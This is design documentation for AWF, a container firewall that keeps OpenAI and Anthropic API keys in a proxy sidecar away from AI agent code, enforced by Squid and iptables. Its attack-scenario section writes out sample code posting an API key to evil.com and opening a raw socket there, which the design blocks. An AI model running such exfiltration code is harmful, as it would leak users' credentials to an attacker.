# Authentication Architecture: How AWF Handles LLM API Tokens

## Overview

The Agentic Workflow Firewall (AWF) implements a multi-layered security architecture to protect LLM API authentication tokens while providing transparent proxying for AI agent calls. This document explains the complete authentication flow, token isolation mechanisms, and network routing for both **OpenAI/Codex** and **Anthropic/Claude** APIs.

> [!IMPORTANT]
> **Both OpenAI/Codex and Anthropic/Claude use identical credential isolation architecture.** API keys are held exclusively in the api-proxy sidecar container (never in the agent container), and both providers route through the same Squid proxy for domain filtering. The only differences are the port numbers (10000 for OpenAI, 10001 for Anthropic) and authentication header formats (`Authorization: Bearer` vs `x-api-key`).

## Architecture Components

AWF uses a **3-container architecture** when API proxy mode is enabled:

1. **Squid Proxy Container** (`172.30.0.10`) - L7 HTTP/HTTPS domain filtering
2. **API Proxy Sidecar Container** (`172.30.0.30`) - Credential injection and isolation
3. **Agent Execution Container** (`172.30.0.20`) - User command execution environment

```
┌─────────────────────────────────────────────────────────────────┐
│ HOST MACHINE                                                     │
│                                                                  │
│  AWF CLI reads environment:                                      │
│  - ANTHROPIC_API_KEY=sk-ant-...                                 │
│  - OPENAI_API_KEY=sk-...                                        │
│                                                                  │
│  Passes keys only to api-proxy container                         │
└────────────────────┬─────────────────────────────────────────────┘
                     │
                     ├─────────────────────────────────────┐
                     │                                     │
                     ▼                                     ▼
┌──────────────────────────────────┐       ┌──────────────────────────────────┐
│ API Proxy Container              │       │ Agent Container                  │
│ 172.30.0.30                      │       │ 172.30.0.20                      │
│                                  │       │                                  │
│ Environment:                     │       │ Environment:                     │
│ ✓ OPENAI_API_KEY=sk-...         │       │ ✗ No ANTHROPIC_API_KEY          │
│ ✓ ANTHROPIC_API_KEY=sk-ant-...  │       │ ✗ No OPENAI_API_KEY             │
│ ✓ HTTP_PROXY=172.30.0.10:3128   │       │ ✓ ANTHROPIC_BASE_URL=            │
│ ✓ HTTPS_PROXY=172.30.0.10:3128  │       │     http://172.30.0.30:10001    │
│                                  │       │ ✓ OPENAI_BASE_URL=               │
│ Ports:                           │       │     http://172.30.0.30:10000    │
│ - 10000 (OpenAI proxy)          │◄──────│ ✓ GITHUB_TOKEN=ghp_...           │
│ - 10001 (Anthropic proxy)       │       │   (protected by one-shot-token)  │
│                                  │       │                                  │
│ Injects auth headers:            │       │ User command execution:          │
│ - x-api-key: sk-ant-...         │       │   claude-code, copilot, etc.     │
│ - Authorization: Bearer sk-...   │       └──────────────────────────────────┘
└────────────────┬─────────────────┘
                 │
                 ▼
┌──────────────────────────────────┐
│ Squid Proxy Container            │
│ 172.30.0.10:3128                 │
│                                  │
│ Domain whitelist enforcement:    │
│ ✓ api.anthropic.com             │
│ ✓ api.openai.com                │
│ ✗ *.exfiltration.com (blocked)  │
│                                  │
└────────────────┬─────────────────┘
                 │
                 ▼
         Internet (api.anthropic.com)
```

## Token Flow: Step-by-Step

### 1. Token Sources and Initial Handling

**Location:** `src/cli.ts:988-989`

When AWF is invoked with `--enable-api-proxy`:

```bash
export ANTHROPIC_API_KEY="sk-ant-..."
export OPENAI_API_KEY="sk-..."

awf --enable-api-proxy --allow-domains api.anthropic.com \
  "claude-code --prompt 'write hello world'"
```

The CLI reads these API keys from the **host environment** at startup.

### 2. Docker Compose Configuration

**Location:** `src/docker-manager.ts:922-978`

AWF generates a Docker Compose configuration with three services:

#### API Proxy Service Configuration

```yaml
api-proxy:
  environment:
    # API keys passed ONLY to this container
    - ANTHROPIC_API_KEY=sk-ant-...
    - OPENAI_API_KEY=sk-...
    # Routes all traffic through Squid
    - HTTP_PROXY=http://172.30.0.10:3128
    - HTTPS_PROXY=http://172.30.0.10:3128
  networks:
    awf-net:
      ipv4_address: 172.30.0.30
```

#### Agent Service Configuration

```yaml
agent:
  environment:
    # NO API KEYS - only base URLs pointing to api-proxy
    - ANTHROPIC_BASE_URL=http://172.30.0.30:10001
    - OPENAI_BASE_URL=http://172.30.0.30:10000
    # GitHub token for MCP servers (protected separately)
    - GITHUB_TOKEN=ghp_...
  networks:
    awf-net:
      ipv4_address: 172.30.0.20
```

**Key Security Decision:** API keys are **intentionally excluded** from the agent container environment (see lines 323-331, 404, and 413-417 in `docker-manager.ts`).

### 3. API Proxy: Credential Injection Layer

**Location:** `containers/api-proxy/server.js`

The api-proxy container runs two HTTP servers:

#### Port 10000: OpenAI Proxy

```javascript
// Read API key from environment (line 46)
const OPENAI_API_KEY = process.env.OPENAI_API_KEY;

// Create proxy agent to route through Squid (lines 34-38)
const proxyAgent = new HttpsProxyAgent({
  host: process.env.SQUID_PROXY_HOST,
  port: parseInt(process.env.SQUID_PROXY_PORT, 10),
});

// Handle incoming request from agent (lines 175-184)
http.createServer((clientReq, clientRes) => {
  // Strip any client-supplied auth headers (security)
  delete clientReq.headers['authorization'];

  // Inject actual API key
  const headers = {
    ...clientReq.headers,
    'Authorization': `Bearer ${OPENAI_API_KEY}`,
    'Host': 'api.openai.com'
  };

  // Forward to real API through Squid
  https.request({
    hostname: 'api.openai.com',
    method: clientReq.method,
    path: clientReq.url,
    headers: headers,
    agent: proxyAgent  // Routes through Squid
  });
});
```

#### Port 10001: Anthropic Proxy

```javascript
// Read API key from environment (line 47)
const ANTHROPIC_API_KEY = process.env.ANTHROPIC_API_KEY;

// Handle incoming request from agent (lines 218-224)
http.createServer((clientReq, clientRes) => {
  // Strip any client-supplied auth headers (security)
  delete clientReq.headers['x-api-key'];

  // Inject actual API key
  const headers = {
    ...clientReq.headers,
    'x-api-key': ANTHROPIC_API_KEY,
    'Host': 'api.anthropic.com'
  };

  // Forward to real API through Squid
  https.request({
    hostname: 'api.anthropic.com',
    method: clientReq.method,
    path: clientReq.url,
    headers: headers,
    agent: proxyAgent  // Routes through Squid
  });
});
```

**Security Feature:** The proxy strips any authentication headers sent by the agent (lines 23-36) and only uses the key from its own environment. This prevents a compromised agent from injecting malicious credentials.

### 4. Agent Container: SDK Transparent Redirection

**Location:** Agent container environment configuration

The agent container sees these environment variables:

```bash
ANTHROPIC_BASE_URL=http://172.30.0.30:10001
OPENAI_BASE_URL=http://172.30.0.30:10000
```

These are **standard environment variables** recognized by:
- Anthropic Python SDK (`anthropic` package)
- Anthropic TypeScript SDK (`@anthropic-ai/sdk`)
- OpenAI Python SDK (`openai` package)
- OpenAI Node.js SDK (`openai`)
- Claude Code CLI
- Codex CLI

When the agent code makes an API call:

**Example 1: Anthropic/Claude**

```python
# Example: Claude Code or custom agent using Anthropic SDK
import anthropic

client = anthropic.Anthropic()
# SDK reads ANTHROPIC_BASE_URL from environment
# Sends request to http://172.30.0.30:10001 instead of api.anthropic.com

response = client.messages.create(
    model="claude-sonnet-4",
    messages=[{"role": "user", "content": "Hello"}]
)
```

**Example 2: OpenAI/Codex**

```python
# Example: Codex or custom agent using OpenAI SDK
import openai

client = openai.OpenAI()
# SDK reads OPENAI_BASE_URL from environment
# Sends request to http://172.30.0.30:10000 instead of api.openai.com

response = client.chat.completions.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "Hello"}]
)
```

The SDKs **automatically use the base URL** without requiring any code changes. The agent thinks it's talking to the real API, but requests are routed through the secure api-proxy sidecar.

### 5. Network Routing: iptables Rules

**Location:** `containers/agent/setup-iptables.sh:131-134, 275`

Special iptables rules ensure proper routing:

```bash
# Allow direct access to api-proxy (bypass normal proxy redirection)
if [ -n "$AWF_API_PROXY_IP" ]; then
  echo "[iptables] Allow traffic to API proxy sidecar (${AWF_API_PROXY_IP})..."
  iptables -t nat -A OUTPUT -d "$AWF_API_PROXY_IP" -j RETURN
fi

# ... later ...

# Accept TCP traffic to api-proxy
iptables -A OUTPUT -p tcp -d "$AWF_API_PROXY_IP" -j ACCEPT
```

Without these rules, traffic to `172.30.0.30` would be redirected to Squid via NAT rules, creating a routing loop.

**Traffic Flow for Anthropic/Claude:**

1. Agent SDK makes HTTP request to `172.30.0.30:10001`
2. iptables allows direct TCP connection (no redirection)
3. API proxy receives request on port 10001
4. API proxy injects `x-api-key: sk-ant-...` header
5. API proxy forwards to `api.anthropic.com` via Squid (using `HttpsProxyAgent`)
6. Squid enforces domain whitelist (only `api.anthropic.com` allowed)
7. Squid forwards to real API endpoint
8. Response flows back: API → Squid → api-proxy → agent

**Traffic Flow for OpenAI/Codex:**

1. Agent SDK makes HTTP request to `172.30.0.30:10000`
2. iptables allows direct TCP connection (no redirection)
3. API proxy receives request on port 10000
4. API proxy injects `Authorization: Bearer sk-...` header
5. API proxy forwards to `api.openai.com` via Squid (using `HttpsProxyAgent`)
6. Squid enforces domain whitelist (only `api.openai.com` allowed)
7. Squid forwards to real API endpoint
8. Response flows back: API → Squid → api-proxy → agent

### 6. Squid Proxy: Domain Filtering

**Location:** `src/squid-config.ts:462-465`

When api-proxy is enabled, Squid configuration includes:

```squid
# Allow api-proxy ports
acl Safe_ports port 10000
acl Safe_ports port 10001

# Allow api-proxy IP address (dst ACL for IP addresses)
acl allowed_ips dst 172.30.0.30
http_access allow allowed_ips

# Allow API domains (dstdomain ACL for hostnames)
acl allowed_domains dstdomain api.anthropic.com
acl allowed_domains dstdomain api.openai.com
http_access allow CONNECT allowed_domains
```

The api-proxy container's environment forces all outbound traffic through Squid:

```yaml
environment:
  HTTP_PROXY: http://172.30.0.10:3128
  HTTPS_PROXY: http://172.30.0.10:3128
```

Even if a compromised api-proxy container tried to connect to a malicious domain, Squid would block it.

## Additional Token Protection Mechanisms

### One-Shot Token Library

**Location:** `containers/agent/one-shot-token/`

While API keys don't exist in the agent container, other tokens (like `GITHUB_TOKEN`) do. AWF uses an LD_PRELOAD library to protect these:

```c
// Intercept getenv() calls
char* getenv(const char* name) {
  if (is_protected_token(name)) {
    // First access: return value and cache it
    char* value = real_getenv(name);
    if (value) {
      cache_token(name, value);
      unsetenv(name);  // Remove from environment
    }
    return value;
  }
  return real_getenv(name);
}

// Subsequent accesses return cached value
// /proc/self/environ no longer shows the token
```

**Protected tokens by default:**
- `ANTHROPIC_API_KEY`, `CLAUDE_API_KEY` (though not passed to agent)
- `OPENAI_API_KEY`, `OPENAI_KEY`
- `GITHUB_TOKEN`, `GH_TOKEN`, `COPILOT_GITHUB_TOKEN`
- `GITHUB_API_TOKEN`, `GITHUB_PAT`, `GH_ACCESS_TOKEN`
- `CODEX_API_KEY`

### Entrypoint Token Cleanup

**Location:** `containers/agent/entrypoint.sh:145-176`

The entrypoint (PID 1) unsets sensitive tokens from its own environment after a 5-second grace period:

```bash
unset_sensitive_tokens() {
  local SENSITIVE_TOKENS=(
    "ANTHROPIC_API_KEY" "CLAUDE_API_KEY" "CLAUDE_CODE_OAUTH_TOKEN"
    "OPENAI_API_KEY" "OPENAI_KEY"
    "GITHUB_TOKEN" "GH_TOKEN" "COPILOT_GITHUB_TOKEN"
    "GITHUB_API_TOKEN" "GITHUB_PAT" "GH_ACCESS_TOKEN"
    "GITHUB_PERSONAL_ACCESS_TOKEN"
    "CODEX_API_KEY"
  )

  for token in "${SENSITIVE_TOKENS[@]}"; do
    if [ -n "${!token}" ]; then
      unset "$token"
      echo "[entrypoint] Unset $token from /proc/1/environ" >&2
    fi
  done
}

# Wait 5 seconds for child processes to start and read tokens
sleep 5
unset_sensitive_tokens &
```

This prevents tokens from being visible in `/proc/1/environ` after the agent starts.

## Security Properties

### Credential Isolation

**Primary Security Guarantee:** API keys **never exist** in the agent container environment.

- Agent code cannot read API keys via `getenv()` or `os.getenv()`
- API keys are not visible in `/proc/self/environ` or `/proc/*/environ`
- Compromised agent code cannot exfiltrate API keys (they don't exist)
- Only the api-proxy container has access to API keys

### Network Isolation

**Defense in Depth:**

1. **Layer 1:** Agent cannot make direct internet connections (iptables blocks non-whitelisted traffic)
2. **Layer 2:** Agent can only reach api-proxy IP (`172.30.0.30`) for API calls
3. **Layer 3:** API proxy routes ALL traffic through Squid (enforced via `HTTP_PROXY` env)
4. **Layer 4:** Squid enforces domain whitelist (only `api.anthropic.com`, `api.openai.com`)
5. **Layer 5:** Host-level iptables provide additional egress control

**Attack Scenario: What if the agent tries to bypass the proxy?**

```python
# Compromised agent tries to exfiltrate API key
import requests

# Attempt 1: Try to read API key
api_key = os.getenv("ANTHROPIC_API_KEY")
# Result: None (key doesn't exist in agent environment)

# Attempt 2: Try to connect to malicious domain
requests.post("https://evil.com/exfiltrate", data={"key": api_key})
# Result: iptables blocks connection (evil.com not in whitelist)

# Attempt 3: Try to bypass Squid
import socket
sock = socket.socket()
sock.connect(("evil.com", 443))
# Result: iptables blocks connection (must go through Squid)
```

All attempts fail due to the multi-layered defense.

### Capability Restrictions

**API Proxy Container:**

```yaml
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
mem_limit: 512m
pids_limit: 100
```

Even if exploited, the api-proxy has no elevated privileges and limited resources.

**Agent Container:**

- Starts with `CAP_NET_ADMIN` for iptables setup
- Drops `CAP_NET_ADMIN` via `capsh --drop=cap_net_admin` before executing user command
- Prevents malicious code from modifying firewall rules

## Configuration Requirements

### Enabling API Proxy Mode

**Example 1: Using with Claude Code**

```bash
# Export Anthropic API key on host
export ANTHROPIC_API_KEY="sk-ant-api03-..."

# Run AWF with --enable-api-proxy flag
awf --enable-api-proxy \
    --allow-domains api.anthropic.com \
    "claude-code --prompt 'Hello world'"
```

**Example 2: Using with Codex**

```bash
# Export OpenAI API key on host
export OPENAI_API_KEY="sk-..."

# Run AWF with --enable-api-proxy flag
awf --enable-api-proxy \
    --allow-domains api.openai.com \
    "codex --prompt 'Hello world'"
```

**Example 3: Using both providers**

```bash
# Export both API keys on host
export ANTHROPIC_API_KEY="sk-ant-api03-..."
export OPENAI_API_KEY="sk-..."

# Run AWF with --enable-api-proxy flag, allowing both domains
awf --enable-api-proxy \
    --allow-domains api.anthropic.com,api.openai.com \
    "your-multi-llm-agent"
```

### Domain Whitelist

When using api-proxy, you must allow the API domains:

```bash
--allow-domains api.anthropic.com,api.openai.com
```

Without these, Squid will block the api-proxy's outbound connections.

### NO_PROXY Configuration

**Location:** `src/docker-manager.ts:969`

The agent container's `NO_PROXY` variable includes:

```bash
NO_PROXY=127.0.0.1,localhost,172.30.0.30,172.30.0.0/16,api-proxy
```

This ensures:
- Local MCP servers (stdio-based) can communicate via localhost
- Agent can reach api-proxy directly without going through a proxy
- Container-to-container communication works properly

## Comparison: With vs Without API Proxy

### Without API Proxy (Direct Authentication)

```
┌─────────────────┐
│ Agent Container │
│                 │
│ Environment:    │
│ ✓ ANTHROPIC_API_KEY=sk-ant-... (VISIBLE)
│                 │
│ Risk: Token     │
│ visible in      │
│ /proc/environ   │
└────────┬────────┘
         │
         ▼
    Squid Proxy
         │
         ▼
  api.anthropic.com
```

**Security Risk:** If the agent is compromised, the attacker can read the API key from environment variables.

### With API Proxy (Credential Isolation)

```
┌─────────────────┐     ┌────────────────┐
│ Agent Container │────▶│ API Proxy      │
│                 │     │                │
│ Environment:    │     │ Environment:   │
│ ✗ No API key    │     │ ✓ ANTHROPIC_API_KEY=sk-ant-...
│ ✓ BASE_URL=     │     │ (ISOLATED)     │
│   172.30.0.30   │     │                │
└─────────────────┘     └────────┬───────┘
                                 │
                                 ▼
                            Squid Proxy
                                 │
                                 ▼
                          api.anthropic.com
```

**Security Improvement:** Compromised agent cannot access API keys (they don't exist in agent environment).

## Key Files Reference

| File | Purpose |
|------|---------|
| `src/cli.ts:988-989` | CLI reads API keys from host environment |
| `src/docker-manager.ts:922-978` | Docker Compose generation, token routing logic |
| `containers/api-proxy/server.js` | API proxy implementation (credential injection) |
| `containers/agent/setup-iptables.sh:131-134, 275` | iptables rules for api-proxy routing |
| `containers/agent/entrypoint.sh:145-176` | Entrypoint token cleanup |
| `containers/agent/one-shot-token/` | LD_PRELOAD library for token protection |
| `src/squid-config.ts:462-465` | Squid Safe_ports configuration for api-proxy |
| `docs/api-proxy-sidecar.md` | User-facing API proxy documentation |
| `docs/token-unsetting-fix.md` | Token cleanup implementation details |

## Summary

AWF implements **credential isolation** through architectural separation:

1. **API keys live in api-proxy container only** (never in agent environment)
2. **Agent uses standard SDK environment variables** (`*_BASE_URL`) to redirect traffic
3. **API proxy injects credentials** and routes through Squid
4. **Squid enforces domain whitelist** (only allowed API domains)
5. **iptables enforces network isolation** (agent cannot bypass proxy)
6. **Multiple token cleanup mechanisms** protect other credentials (GitHub tokens, etc.)

This architecture provides **transparent operation** (SDKs work without code changes) while maintaining **strong security** (compromised agent cannot steal API keys).
